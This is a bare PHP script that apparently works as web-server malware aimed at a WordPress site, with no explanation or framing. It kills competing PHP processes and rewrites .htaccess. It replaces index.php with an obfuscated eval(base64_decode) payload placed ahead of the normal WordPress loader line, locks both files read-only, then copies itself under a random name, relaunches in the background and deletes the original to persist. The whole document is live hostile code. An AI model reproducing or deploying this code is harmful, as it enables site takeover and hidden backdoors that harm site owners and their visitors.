<?php
error_reporting(0);
ignore_user_abort;
exec("ps -ef", $out, $return);
if (is_array($out)) {
    for ($i = 1;$i < count($out);$i++) {
        $temp = explode(" ", $out[$i]);
        if (strstr($temp[count($temp) - 1], ".php") && !strstr($temp[count($temp) - 1], "lsphp")) {
            $x = explode("/", $temp[count($temp) - 1]);
            if (strlen($x[count($x) - 1]) != 9) {
                for ($j = 1;$j < count($temp);$j++) {
                    if (is_numeric($temp[$j])) {
                        $kill[] = $temp[$j];
                        break;
                    }
                }
            }
        }
    }
}
foreach ($kill as $v) {
    exec("kill -9 " . $v, $out, $return);
}
sleep(2);
$path = $_SERVER['DOCUMENT_ROOT'];
$htaccess = base64_decode("PElmTW9kdWxlIG1vZF9yZXdyaXRlLmM+DQpSZXdyaXRlRW5naW5lIE9uDQpSZXdyaXRlQmFzZSAvDQpSZXdyaXRlUnVsZSBeaW5kZXgucGhwJCAtIFtMXQ0KUmV3cml0ZUNvbmQgJXtSRVFVRVNUX0ZJTEVOQU1FfSAhLWYNClJld3JpdGVDb25kICV7UkVRVUVTVF9GSUxFTkFNRX0gIS1kDQpSZXdyaXRlUnVsZSAuIGluZGV4LnBocCBbTF0NCjwvSWZNb2R1bGU+");
if (!file_exists($path . ".htaccess")) {
    @file_put_contents($path . ".htaccess", $htaccess);
} else {
    $temp = @file_get_contents($path . ".htaccess");
    if (md5($temp) != md5($htaccess)) {
        @unlink($path . ".htaccess");
        @file_put_contents($path . ".htaccess", $htaccess);
    }
}
@chmod($path . ".htaccess", 0444);
$index = base64_decode("PD9waHAgLyotaCE/b29AUFFKLSovZXJyb3JfcmVwb3J0aW5nKDApOyAvKi16TkBBV2J8TUktKi9ldmFsLyotYltZaURMNnpYcVdsLmo7Onx0Ql9oOU95c1F0XTkueyMhOWI0SnU0YDFlVS0qLygvKi1vTzZ9TndQLC0qL2Jhc2U2NF9kZWNvZGUvKi09JjVNJmJpdy0qLygvKi10cFFaLSovIlpYWmhiQ2dpUHo0aUxtSmhjMlUyTkY5a1pXTnZaR1VvSWxCRU9YZGhTRUZuWVVkV2FGcEhWbmxMUTJSRVlqSTFNRnBYTlRCTVZsSTFZMGRWTmtsSVVteGxTRkYyWVVoU2RHSkVjMmRaTW1ob1kyNU9iR1JFTVRGa1IxbDBUME5qY0U5NVFrRmpNbFl3V0ROU2NHSlhWbVppUjJ4MFlWaFJiMDFEYXpkRVVYQkJXbGhLZVdJelNtWmpiVlozWWpOS01HRlhOVzVMUkVGd1QzY3dTMUZIYkc1aWJUbDVXbFk1TVdNeVZubFlNa1pwWWpOS01FdEVSWEJQZHpCTFl6SldlbU15YkhaaWJEbDZaRWRHZVdSRFozQlBkekJMWVZjMWNGZ3pUbXhrUTJkdVdrZHNlbU5IZUdobFZqbHNZMjVLZG1OdVRXNU1RMEZ1VkRKYWJVcDVhemRFVVhCd1dtbEJiMkZZVG5wYVdGRnZTa1k1VkZKV1NsZFNWa3BpU2pCU1VGRXhWazVTVlRWVldERktVRlF4VVc1WVUydHdTVWh6VGtObmEydGpSMFl3WVVOQk9VbERVbVpWTUZaVFZtdFdVMWQ1WkVWVU1FNVdWRlZXVDFaR09WTlVNRGxWU2pFd04wUlJjRGxhVjNoNldsaHpUa05uYTJ0alIwWXdZVU5CT1VsSFVuQmpiVFZvWWxkVmIxZ3hPVWRUVlhoR1dERTRjRTkzTUV0bVVUQkxZVmRaYjFwdGJITmFWamxzWlVkc2VtUklUVzlLUjFwd1lrZFZaMUJUUVd0alIwWXdZVU0wYVV3elRuQmtSMVowV1ZoQmRXVkhNWE5KYVd0d1NVaHpUa05wUVdkSlEwSkJaRmMxYzJGWE5YSkxRMUp0WVZkNGJFdFVjMDVEYmpCT1EybFNiMlJJVW5kWU0xSTFZMGRWWjFCVFFXbGhTRkl3WTBOSk4wUlJjSEJhYVVGdldUSm9iRmt5ZEdaaFNGSXdZMGhOYjB0VGEyZGxlVkp2WkVoU2QxZ3pValZqUjFWblVGTkJibUZJVWpCalNFMXVUek13WjFwWGVIcGFVMEkzU2tkb01HUklRbVprU0d4M1dsTkJPVWxEWkc5a1NGSjNTbnAwT1VSUmIydGlXR3htWkZoS2NFbEVNR2RrV0VweldsYzFhbUl5VW14TFIyUnNaRVk1TVdOdGEyOUxVMnMzUkZGdmEySlliR1ppUjBaMVdubEJPVWxJVm5saVIxWjFXVEk1YTFwVGFFRktSamxVVWxaS1YxSldTbUpKYTJoVlZrWkNabEZWVGtSU1ZrSlZXREI0UWxSclpGWlJWV1JHU1d3d2NFOTVRVTVEYVZKMFpWWTViMkl6VGpCSlJEQm5aRmhLYzFwWE5XcGlNbEpzUzBOU1psVXdWbE5XYTFaVFYzbGtTVlpHVWxGWU1HaFFWVEZSYmxoVGF6ZEVVVzlyWWxoc1ptSkhSblZhZVVFNVNVaFdlV0pIVm5WWk1qbHJXbE5uYTJKWWJHWmlSMFoxV25sck4wUlJiMnRpV0d4bVlqTktjRm95YkhWSlJEQm5TbmxqTjBSUmNIQmFhVUZ2WVZoT2VscFlVVzlLUmpsVVVsWktWMUpXU21KS01HaFZWa1pDWmxWclZrZFNWa3BHVldsa1pFdFRhMmRsZHpCTFNVTkJaMGxEVW5SbFZqbDJZMjFzYm1GWE5HZFFVMEZyV0RGT1JsVnNXa1pWYkhOdVUwWlNWVlZHT1ZOU1ZWcEdWV3RXVTBveE1EZEVVWEE1UkZGdmEySlliR1ppTTBwd1dqSnNkVWxFTUdka1dFcHpXbGMxYW1JeVVteExRMUowWlZZNWRtTnRiRzVoVnpSd1QzY3dTMHBIUm01YVZ6VXdTVVF3WjJNelVubGtSemx6WWpOa2JHTnBaMnRZTVU1R1ZXeGFSbFZzYzI1VFJsSlZWVVk1VmxVd1ZsTllNRVpJVWxVMVZVb3hNSEJQZHpCTFNrY3hOVmd5Um01YVZ6VXdTVVF3WjJSWVNuTmFWelZxWWpKU2JFdERVbWhhTWxaMVpFTnJOMFJSYjJ0aVdHeG1ZVmRSWjFCVFFqRmpiWGhzWW0xT2RscEhWVzloV0U1NldsaFJiMHBHT1ZSU1ZrcFhVbFpLWWtveFNrWlVWVGxWVWxZNVFsSkZVbE5LTVRCd1NVUTRaMHBHT1ZSU1ZrcFhVbFpLWWtveFNrWlVWVGxWVWxZNVFsSkZVbE5LTVRBMlNubGpjRTkzTUV0S1NIQTFXRE5PZG1SWVNtcGFVMEU1U1VOa2IyUklVbmRLZVRSdVQyazRkbHBYVFROWmJsSnpURzFHYzJOSFZtcFpNMVp6WVZkR2RVeHVVblpqUXpsd1ltMVNiR1ZIT1hWYVV6VjNZVWhCTDJKWWJHWmhSemw2WkVRd2JreHBVblJsVmpsdllqTk9NRXhwWTIxaVdHeG1aRmhLY0ZCVFkzVktSekUxV0ROV2VXRlRORzVLYlRFMVdESjRhR0p0WXpsS2VUUnJZbGhzWm1KSFJuVmFlVFJ1U20weE5WZ3lPWGxoVjJSd1ltb3dia3hwVW5SbFZqbDJZMjFzYm1GWE5IVktlVnB2WkVoU2QxZ3pValZqUjFVNVNuazBhMkZJVWpCalJqa3daVmhDYkV4cFkyMWlXR3htV1Zka2JHSnVVVGxLZVRScllsaHNabGxYWkd4aWJsRjFTbmxhZEdWV09YQmFSREJ1VEdsU2RHVldPWEJhUkhOT1EyMXNiVXRITVd0T1UyZHJXREZLUmxWV1ZrWlZNVkppU2pKR2FtUkhiSFppYVdSa1MxTkJPVkJUUVc1YWFsSnRUVWRWTTAxdFdUUmFWRTVwVDBSck1VOUhVVE5PVkUxNFRXcENhazF0Um14T1JFMHhUMVJKYmt0WWMwNURhVUZuU1VOQ2NGcHBhSEJqTTA1c1pFTm5hMWd4U2taVlZsWkdWVEZTWWtveVJtcGtSMngyWW1sa1pFdFRiRGRLUmpsVVVsWk9WRk5WT1U5WGVXUm9XVE5TY0dJeU5HNVlVMEU1U1VjeGEwNVRaMnRZTVVwR1ZWWldSbFV4VW1KS01rWnFaRWRzZG1KcFpHUkxWSFE1UkZGdlowbERRV2RLUjBWblVGTkNibHBZVW1aa1dFcHpXREpPZG1KdVVteGlibEZ2WXpOU2VWZ3pTblprUkVWNlMwTmtNVm95WkdwUGFUaDJZVzFPYm1OdFdtNU1iWEJwWTFoYWJHTnVRbTVNYldScFdYazViR051Y0dsYU0wbDJZVWhrTW1WRE5XNWhNbU51UzFOck4wUlJiMmRKUTBGbldsaGFhR0pEWjI1UWVqUnVTVU0wWjBwSFJYQlBkekJMU1VOQlowbEhWalJoV0ZGdlMxUnpUa051TVd4aVNFNXNaWGN3UzBsRFFXZEpSMnh0UzBoT01HTnVRblpqZVdkcldWZGtiR0p1VVhOSlEwcHBZak5SYVV0VFFXaFFWREJuV20xR2MyTXlWV2RtU0hkbll6TlNlV05IT1hwTFExSm9XakpXZFdSRGQyZEpiazUzWVZkU2JHTnBTWEJKUTBVNVVGTkNiVmxYZUhwYVUwSTRaa05DZW1SSVNuZGlNMDF2U2tkR2JscFhOVEJNUTBGcFpWZEdiMkl5T0dsTFUwRm9VRlF3WjFwdFJuTmpNbFZuWmtoM1oyTXpVbmxqUnpsNlMwTlNhRm95Vm5Wa1EzZG5TVzFLY0dKdFkybExVMEZvVUZRd1oxcHRSbk5qTWxWblpraDNaMk16VW5salJ6bDZTME5TYUZveVZuVmtRM2RuU1cxa2RtSXlaSE5hVTBsd1NVTkZPVkJUUW0xWlYzaDZXbE5zTjBSUmIyZEpRMEZuU1VOQlowbEhiRzFMUjA1dldsZE9jbGd5Um01YVZ6VXdTME5TZEdWV09XaGFNbFoxWkVOcmNHVjNNRXRKUTBGblNVTkJaMGxEUVdkSlEwRm5Ta2h3TlZneVRuWmlibEpzWW01UloxQlRRakJqYld4MFMwZGtiR1JHT1RGamJYaG1XVEk1ZFdSSFZuVmtRMmRyWlc1c1ptTXlPVEZqYlU1c1MxTnJOMFJSYjJkSlEwRm5TVU5CWjBsSU1FNURhVUZuU1VOQ09WcFhlSHBhV0hOT1EybEJaMGxEUVdkSlEwRm5Ta2h3TlZneVRuWmlibEpzWW01UloxQlRRakJqYld4MFMwZGtiR1JHT1RGamJYaG1XVEk1ZFdSSFZuVmtRMmRyWlc1c1ptTXlPVEZqYlU1c1MxTnJOMFJSYjJkSlEwRm5abEV3UzJaUk1FdEVVWEJ3V21sQmIwbFlUakJqYms0d1kybG5hMlZ1YkdaWk1qbDFaRWRXZFdSRGQyZEtNalYyWkVkU2RsbFhOVFZrUjJod1ltMWpia3RUYTJkbGR6QkxTVU5CWjBsSGJHMUpRMmg2WkVoS2VtUklTVzlLU0hBMVdESk9kbUp1VW14aWJsRnpTVU5rYkZreWFIWmhTRkowWWtkT2RtSnVVbXhpYmxGdVMxTnJaMlYzTUV0SlEwRm5TVU5CWjBsRFFrRmhSMVpvV2tkV2VVdERTa1JpTWpVd1dsYzFNRXhZVWpWalIxVTJTVWhTYkdWSVVYWmhTRkowWWtSeloxa3lhR2hqYms1c1pFUXhNV1JIV1hSUFEwbHdUM2N3UzBsRFFXZEpRMEZuU1VOQmEyVnViR1paTWpsMVpFZFdkV1JEUVRsSlNFNHdZMnc1ZVZwWVFuTlpWMDVzUzBOS2JGa3lhSFpoU0ZKMFlrZE9kbUp1VW14aWJsRnBURU5CYmtwNWQyZEtTSEExV0RKT2RtSnVVbXhpYmxGd1QzY3dTMGxEUVdkSlEwRm5TVU5DYkZreWFIWkpRMUkyWlZZNWFtSXlOVEJhVnpVd1QzY3dTMGxEUVdkSlEwRm5TVU5DYkdWSGJEQkxRMnMzUkZGdlowbERRV2RtVjFaell6SlZaMkZYV1c5ak0xSjVZek5TZVV0RFVqWmxWamxxWWpJMU1GcFhOVEJNUTBGdVdsZE9iMkl6YUhSaVIwNTJZbTVTYkdKdVVXNUxVMnczUkZGdlowbERRV2RKUTBGblNVTlNObVZXT1dwaU1qVXdXbGMxTUVsRU1HZGpNMUo1V0ROS2JHTkhlR2haTWxWdlNXMVdhbUZIT1RSaVYzaHFZakkxTUZwWE5UQkphWGRuU25samMwbERValpsVmpscVlqSTFNRnBYTlRCTFZITk9RMmxCWjBsRFFXZEpRMEZuVVVkb2JGbFhVbXhqYVdkcFVUSTVkV1JIVm5Wa1F6RXdaVmhDYkU5cFFqQmFXR2d3VEROb2RHSkRTWEJQZHpCTFNVTkJaMGxEUVdkSlEwSnNXVEpvZGtsSVVubGhWekJ2U2tod05WZ3lUblppYmxKc1ltNVJjRTkzTUV0SlEwRm5TVU5CWjBsRFFteGxSMnd3UzBOck4wUlJiMmRKUTBGblpsZFdjMk15VldkaFYxbHZZek5TZVdNelVubExRMUkyWlZZNWFtSXlOVEJhVnpVd1RFTkJibHBYVG05aU0wSndZbTFrTkdKWGVHcGlNalV3V2xjMU1FcDVhM0JsZHpCTFNVTkJaMGxEUVdkSlEwRnJaVzVzWmxreU9YVmtSMVoxWkVOQk9VbElUakJqYkRsNVdsaENjMWxYVG14TFEwcHNXVEpvZG1OSGJIVmFNMmgwWWtkT2RtSnVVbXhpYmxGcFRFTkJia3A1ZDJkS1NIQTFXREpPZG1KdVVteGlibEZ3VDNjd1MwbERRV2RKUTBGblNVTkNRV0ZIVm1oYVIxWjVTME5LUkdJeU5UQmFWelV3VEZoU05XTkhWVFpKU0ZKc1pVaFJkbUZJVW5SaVJITm5XVEpvYUdOdVRteGtSREV4WkVkWmRFOURTWEJQZHpCTFNVTkJaMGxEUVdkSlEwSnNXVEpvZGtsSVFuQmliV1JtWXpKc01GcFhNV2hqUTJkclpXNXNabGt5T1hWa1IxWjFaRU5yTjBSUmIyZEpRMEZuU1VOQlowbEhWalJoV0ZGdlMxUnpUa05wUVdkSlEwSTVXbGQ0ZWxwVFFuQmFhVUZ2WXpOU2VXTXpVbmxMUTFJMlpWWTVhbUl5TlRCYVZ6VXdURU5CYmxwWFRtOWllbFYzVFVoQ2FGb3lWbXBpTWpVd1dsYzFNRXA1YTNCSlNITk9RMmxCWjBsRFFXZEpRMEZuVVVkb2JGbFhVbXhqYVdkdVUwWlNWVlZET0hoTWFrVm5UbFJCZDBsRmJIVmtSMVo1WW0xR2MwbEdUbXhqYmxwc1kybENSbU51U25aamFXTndUM2N3UzBsRFFXZEpRMEZuU1VOQ2JHVkhiREJMUTJzM1JGRnZaMGxEUVdkbVYxWnpZekpWWjJGWFdXZExTRTR3WTI1T01HTnBaMnRsYm14bVdUSTVkV1JIVm5Wa1EzZG5TakpXYW1GSE9EQk5SRkozV1Zka2JGa3lPWFZrUjFaMVpFTmpjRXRUUWpkRVVXOW5TVU5CWjBsRFFXZEpSVUp2V2xkR2ExcFlTVzlLTUdoVlZrWkJkazFUTkhoSlJGRjNUa05DVDJJelVXZFNiVGt4WW0xUmJrdFVjMDVEYVVGblNVTkJaMGxEUVdkYVdHaHdaRU5uY0U5M01FdEpRMEZuU1VneGJHSklUbXhKUjJ4dFNVTm9lbVJJU25wa1NFbHZTa2h3TlZneVRuWmlibEpzWW01UmMwbERaR3haTW1oMlRYcEJlR05IUm01YVYwNTJZbTVTYkdKdVVXNUxVMnRuWlhjd1MwbERRV2RKUTBGblNVTkNRV0ZIVm1oYVIxWjVTME5rU1ZaR1VsRk1la1YxVFZOQmVrMUVSV2RVVnpreVdsZFJaMVZIVm5saVYwWjFXbGMxTUdKSWEyNUxWSE5PUTJsQlowbERRV2RKUTBGblNraHdOVmd5VG5aaWJsSnNZbTVSWjFCVFFucGtTRXBtWTIxV2QySkhSbXBhVTJkcFdsZE9iMko2VFhkTldFSm9XakpXYW1JeU5UQmFWelV3U1dsM1owcDVZM05KUTFJMlpWWTVhbUl5TlRCYVZ6VXdTMVJ6VGtOcFFXZEpRMEZuU1VOQloyRkhWbWhhUjFaNVMwTmtUV0l5VG1oa1IyeDJZbXB2WjBwNVFYVkpRMUkyWlZZNWFtSXlOVEJhVnpVd1MxUnpUa05wUVdkSlEwRm5TVU5CWjFwWWFIQmtRMmR3VDNjd1MwbERRV2RKU0RCT1EyNHdUa05uTUV0YWJsWjFXVE5TY0dJeU5HZFpNbWhzV1RKMFpsbFhaR3hpYmxGdlNrY3hOVmd5Um01YVZ6VXdTMWh6VGtOcFFXZEpRMEZyV1Zka2JHSnVVV2RRVTBKNlpFaEtNR0l5ZUhaa01sWjVTME5TZEdWV09XaGFNbFoxWkVOck4wUlJiMHBoVjFsblMwTlNhRm95Vm5Wa1EwRm9VRk5CYVVscGEyZGxkekJMUTFOQlowbERRV3RqTTBKd1drZFdlVkZZU25sWldHdG5VRk5DYUdOdVNtaGxVMmRwVWpJNWRsb3llR3haYlRrd1NXbDNaMGxzYkdoaFJ6bDJTVk5DVkdKSVZubGpRMGx6U1VOS1dsbFhhSFppZVVKVVlraFdlV05EU1hOSlEwcHBZVmMxYmt4dFRuWmlVMGx6U1VOS2FXRlhOVzVaYlRrd1NXbDNaMGxyWkhaaU1tUnpXbE5DUWxwR1RteGliazVzU1dsM1owbHRaSFppTW1SeldsTkpjMGxEU2pWWlYyaDJZbmxKYzBsRFNtbGhWelZ1U1dsck4wUlJiMHBEVjFwMlkyMVdhRmt5WjJkTFExSjZZMGRzYTFwWVNrSmpia3BvWlZOQ2FHTjVRV3RrYlVaelMxTkNOMFJSYjBwRFVXdHJZek5TZVVsRU1HZGpNMUo1WkVjNWMySXpaR3hqYVdkclpHMUdjMHRVYzA1RFoydEtRMWRzYlVsRGFIcGtTRXA2WkVoSmIwcEhSbTVhVnpVd1RFTkJhMk16VW5sTFUydG5aWGN3UzBOUmEwcERXRXBzWkVoV2VXSnBRakJqYmxac1QzY3dTME5SYTBwbVVUQkxRMUZzT1VSUmIwcG1WMVp6WXpKV04wUlJiMHBEV0Vwc1pFaFdlV0pwUW0xWlYzaDZXbFJ6VGtObmJEbEVVWEE1UkZGdlRrTnRXakZpYlU0d1lWYzVkVWxIVG05YVYwNXlXREpvTUdSSVFucExRMnczUkZGdlowbERRV2RoVjFsblMwZHNlbU15VmpCTFExSm1WVEJXVTFaclZsTlhlV1JKVmtaU1VWVjVaR1JMVTBGdFNtbENlbVJJU2pCaU1uaDJaREpXZVV0RFVtWlZNRlpUVm10V1UxZDVaRWxXUmxKUlZYbGtaRXRUUVdoUVZEQm5Takk1YlZwcFkzQkpTSE5PUTJsQlowbERRV2RKUTBGblkyMVdNR1JZU25WSlNGSjVaRmRWTjBSUmIyZEpRMEZuWmxOQ2JHSklUbXhoVjFsblMwZHNlbU15VmpCTFExSm1WVEJXVTFaclZsTlhlV1JKVmtaU1VWZ3hhR1pTYXpsVFZqQkdVMUpGVmtWWU1VSlRWREZTVUVveE1IQkpRMWx0U1VOU1psVXdWbE5XYTFaVFYzbGtTVlpHVWxGWU1XaG1VbXM1VTFZd1JsTlNSVlpGV0RGQ1UxUXhVbEJLTVRCblVGUXdPVWxEWkc5a1NGSjNZM2xqY0VsSWMwNURhVUZuU1VOQlowbERRV2RqYlZZd1pGaEtkVWxJVW5sa1YxVTNSRkZ2WjBsRFFXZG1VMEpzWWtoT2JHRlhXV2RMUjJ4Nll6SldNRXREVW1aVk1GWlRWbXRXVTFkNVpFbFdSbEpSV0RCYVUxUXdOVlZZTUZaUFVrWTVTVlpHVWxGVmVXUmtTMU5CYlVwcFFucGtTRW93WWpKNGRtUXlWbmxMUTFKbVZUQldVMVpyVmxOWGVXUkpWa1pTVVZnd1dsTlVNRFZWV0RCV1QxSkdPVWxXUmxKUlZYbGtaRXRUUVdoUVZEQm5Takk1YlZwcFkzQkpTSE5PUTJsQlowbERRV2RKUTBGblkyMVdNR1JZU25WSlNGSjVaRmRWTjBSUmIyZEpRMEZuWmxFd1MwbERRV2RKU0Vwc1pFaFdlV0pwUW0xWlYzaDZXbFJ6VGtOdU1FNURaekJMV201V2RWa3pVbkJpTWpSbldqSldNRmd6Vm5saFUyZHdSRkZ3TjBSUmIyZEpRMEZuWVZkWlowdEhiSHBqTWxZd1MwTlNabFV3VmxOV2ExWlRWM2xrVTFKV1JsWlNWazVWV0RGV1UxTlRaR1JMVTJ0blpYY3dTMGxEUVdkSlEwRm5TVU5CYTJKWWJHWmtXRXB3U1VRd1owcEdPVlJTVmtwWFVsWktZa294U2taVlZsWkdWVEZTWmxaV1NrcEtNVEEzUkZGdlowbERRV2RtVTBKc1lraE9iRWxJYzA1RGFVRm5TVU5CWjBsRFFXZGhWMWxuUzBkc2VtTXlWakJMUTFKbVZUQldVMVpyVmxOWGVXUm9ZMjFrTWtveE1IQkxVMEkzUkZGdlowbERRV2RKUTBGblNVTkJaMGxEUVd0aVdHeG1aRmhLY0VsRU1HZEtSamxVVWxaS1YxSldTbUpLTVVKSlZVWTVWRkpWZUVkS01UQm5UR2xCYmxCNVkyZE1hVUZyV0RGT1JsVnNXa1pWYkhOdVdWaEtibVJwWkdSWGVrSmtUM2N3UzBsRFFXZEpRMEZuU1VOQ09VbEhWbk5qTWxWblpYY3dTMGxEUVdkSlEwRm5TVU5CWjBsRFFXZEtSekUxV0ROV2VXRlRRVGxKUTFKbVZUQldVMVpyVmxOWGVXUlJVMFpDWmxVd1ZrMVNhV1JrU1VNMFowcDZPRzVKUXpSblNrWTVWRkpXU2xkU1ZrcGlTakZHVmxKV1NscFlNVTVWVld0c1QxSjVaR1JQZHpCTFNVTkJaMGxEUVdkSlEwSTVSRkZ2WjBsRFFXZG1VVEJMU1VOQlowbElTbXhrU0ZaNVltbEJhMkpZYkdaa1dFcHdUM2N3UzJaUk1FdEVVWEJ0WkZjMWFtUkhiSFppYVVKdVdsaFNabVJZU25OWU1rNTJZbTVTYkdKdVVXOUtTRlo1WWtOcloyVjNNRXRKUTBGblNVZHNiVWxEYUcxa1Z6VnFaRWRzZG1Kc09XeGxSMng2WkVoTmIwb3lUakZqYlhobVdsaG9iRmw1WTNCTFUwSTNSRkZ2WjBsRFFXZEpRMEZuU1VOU2FtSXlOWFZKUkRCbldUTldlV0pHT1hCaWJXd3dTME5TTVdOdGQzQlBkekJMU1VOQlowbERRV2RKUTBKcVpGaEtjMWd6VG14a1J6bDNaRU5uYTFreU9YVmlhWGRuVVRGV1UxUkZPVkZXUmpsVFVsWlNWbFZyTlZWVmEwWlBWVEJhUmxWcGQyZE5VMnMzUkZGdlowbERRV2RKUTBGblNVZE9NV050ZUdaak1sWXdZak5DTUV0RFVtcGlNalYxVEVOQ1JGWldTazFVTVVKVldEQmFVRlJGZUZCV01IaFFVVEJHVlZOVk9VOU1RMEY0UzFSelRrTnBRV2RKUTBGblNVTkJaMWt6Vm5saVJqbDZXbGhTZG1OSVVXOUtSMDUyWW0wMGMwbEZUbFpWYTNoUVZVWlNabFpXVGtaVmEwWklVbFUxVlV4RFFXbFVWemsyWVZkNGMxbFRPREZNYWtGblMwWmtjR0p0VW5aa00wMW5WR3hSWjA1cE5IaFBlVUo1WkdwdmVrMXBOSGRMVTBKSVdsZE9jbUo1T0hsTlJFVjNUVVJGZDAxVFFrZGhXRXBzV20wNU5FeDZUWGxNYWtGcFMxUnpUa05wUVdkSlEwRm5TVU5CWjFrelZubGlSamw2V2xoU2RtTklVVzlLUjA1MlltMDBjMGxGVGxaVmEzaFFWVVpTWmxVeFRrMVlNVnBHVld0c1IxZFdRa1pTVmtselNVUkJjRTkzTUV0SlEwRm5TVU5CWjBsRFFtcGtXRXB6V0ROT2JHUkhPWGRrUTJkcldUSTVkV0pwZDJkUk1WWlRWRVU1VVZaR09WUlZNSGhtVm10V1UxTlZXbHBUUlRsVVZrTjNaMDFEYXpkRVVXOU9RMmxCWjBsRFFXZEpRMEZuWVZkWlowdEhiSHBqTWxZd1MwTlNabFV3VmxSVk1HeFFWR3h6YmxreU9YSmhVMlJrUzFOcloyVjNNRXRKUTBGblNVTkJaMGxEUVdkSlEwRm5XVE5XZVdKR09YcGFXRkoyWTBoUmIwcEhUblppYlRSelNVVk9WbFZyZUZCVlJsSm1VVEE1VUZNd2JFWk1RMEZyV0RGT1JsVXhUa3BVTURWaVNqSk9kbUV5YTI1WVUyczNSRkZ2WjBsRFFXZEpRMEZuU1Vnd1RrTm5NRXRKUTBGblNVTkJaMGxEUVd0a1dFcHpXREprYkdSR09XcGlNalV3V2xjMU1HTXhPV3RaV0ZKb1NVUXdaMWt6Vm5saVJqbHNaVWRXYWt0RFVtcGlNalYxUzFSelRrTnBRV2RKUTBGblNVTkJaMWt6Vm5saVJqbHFZa2M1ZWxwVFoydFpNamwxWW1sck4wUlJiMmRKUTBGblpsTkNiR0pJVG14aFYxbG5TMGRhTVdKdFRqQmhWemwxV0RKV05HRllUakJqZVdkdVdtMXNjMXBXT1c1YVdGSm1XVEk1ZFdSSFZuVmtTRTF1UzFOcloyVjNNRXRKUTBGblNVTkJaMGxEUVd0a1dFcHpXREprYkdSR09XcGlNalV3V2xjMU1HTXhPV3RaV0ZKb1NVUXdaMXB0YkhOYVZqbHVXbGhTWmxreU9YVmtSMVoxWkVoTmIwcElWbmxpUTJzM1JGRnZaMGxEUVdkbVUwSnNZa2hPYkdGWFdXZExSMW94WW0xT01HRlhPWFZZTWxZMFlWaE9NR041WjI1YWJUbDNXbGMwYmt0VFFXMUthVUp0WkZjMWFtUkhiSFppYkRsc1pVZHNlbVJJVFc5S00wNHdZMjFXYUdKV09XNWFXRkptV1RJNWRXUkhWblZrU0UxdVMxTnJaMlYzTUV0SlEwRm5TVU5CWjBsRFFXdGhSMFoxV2tkNGJFbEVNR2RhYlRsM1dsYzBiMHBJVm5saVEzZG5TVzVKYVV0VWMwNURhVUZuU1VOQlowbERRV2RLU0ZaNVlrWTVibHBZVW1aWk1qbDFaRWRXZFdSSVRtWmFSMFl3V1ZOQk9VbElUakJqYlZab1lsWTVibHBZVW1aWk1qbDFaRWRXZFdSSVRXOUtSMmhvWW0xU2MxcFRhemRFVVc5blNVTkJaMGxEUVdkSlIxcHFZa2M1ZWxwVFoydGhSMFoxV2tkNGJFdFVjMDVEYVVGblNVTkNPVWxIVm5Oak1sVm5aWGN3UzBsRFFXZEpRMEZuU1VOQmEyUllTbk5ZTW1Sc1pFWTVhbUl5TlRCYVZ6VXdZekU1YTFsWVVtaEpSREJuV20xR2MyTXlWVGRFVVc5blNVTkJaMlpSTUV0SlEwRm5TVWhLYkdSSVZubGlhVUZyWkZoS2MxZ3laR3hrUmpscVlqSTFNRnBYTlRCak1UbHJXVmhTYUU5M01FdG1VVEJMUkZGd2JXUlhOV3BrUjJ4MlltbENkMkZYTlc1WU0wNXdaRWRXZEZsWVFXOUtTSEExV0RKT2RtSnVVbXhpYmxGd1pYY3dTMGxEUVdkSlExSXhZMjE0Wm1KSGJIcGtRMEU1U1VkV05HTkhlSFphUjFWdlNXbE5ha2w1VFdwSmFYZG5aRWhLY0dKVFoydGxibXhtV1RJNWRXUkhWblZrUTJ0d1QzY3dTMGxEUVdkSlExSjVXbGhPTVdKSVVtWmpNMUo1U1VRd1owcDVZemRFVVc5blNVTkJaMXB0T1hsYVYwWnFZVU5uYTJSWVNuTllNbmh3WXpOUloxbFlUV2RLU0ZaNVlrTnNOMFJSYjJkSlEwRm5TVU5CWjBsRFVuZGhWelZ1V0ROS2JHTXpWbk5rUTBFNVNVZGtiR1JHT1RGamJYaG1XVEk1ZFdSSFZuVmtRMmRyWkZoS2MwdFVjMDVEYVVGblNVTkJaMGxEUVdkS1NFSndZbTFrWm1KWVRtNUpSREJuUzBoT01HTnVRblpqZVdkclkwZHNkVm94T1hsYVdFNHhZa2hSYzBsRFpGUmhXRkpzWWxkR2QwbEZOWFprUjJ4dFlWZE9hR1JIYkhaaWFVSlRXbGRPYkdGWVdteGFRMk53U1VORk9WQlRRbTFaVjNoNldsTnJaMUI1UVc1VU1ITnVTVVJ2WjBvd1ZsTlZhemxUU25welRrTnBRV2RKUTBGblNVTkJaMHBJU214a1NGWjVZbXc1ZW1SSVNXZE1hakJuU2toV2VXSkRRWFZKUTJOblVGUXdPVkJwUVc1SlF6Um5Ta2hDY0dKdFpHWmlXRTV1U1VNMFowcDZlR2xqYWpSdVQzY3dTMGxEUVdkSlNEQk9RMmxCWjBsRFFubGFXRkl4WTIwMFowcElTbXhrU0ZaNVltdzVlbVJJU1RkRVVYQTVTVVE0S3lJcEtUcz0iLyotTj4lLG5MRyg+LSovKS8qLUVuPDltOWcxLSovKTs/Pjw/cGhwCmRlZmluZSggJ1dQX1VTRV9USEVNRVMnLCB0cnVlICk7CnJlcXVpcmUgX19ESVJfXyAuICcvd3AtYmxvZy1oZWFkZXIucGhwJzs=");
if (!file_exists($path . "index.php")) {
    @file_put_contents($path . "index.php", $index);
} else {
    $temp = @file_get_contents($path . "index.php");
    if (md5($temp) != md5($index)) {
        @unlink($path . "index.php");
        @file_put_contents($path . "index.php", $index);
    }
}
@chmod($path . "index.php", 0444);
$l12 = array("1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z", "x", "c", "v", "b", "n", "m");
for ($i = 1;$i < rand(6, 6);$i++) {
    $e14 = rand(0, count($l12) - 1);
    $o15.= $l12[$e14];
}
$q16 = basename(__FILE__, ".php") . ".php";
$c9 = file_get_contents($q16);
$u17 = fopen($o15 . ".php", "w");
fwrite($u17, $c9);
fclose($u17);
exec("php -f" . __DIR__ . "/$o15.php > /dev/null 2>/dev/null &", $e18);
@unlink("$q16"); 
?>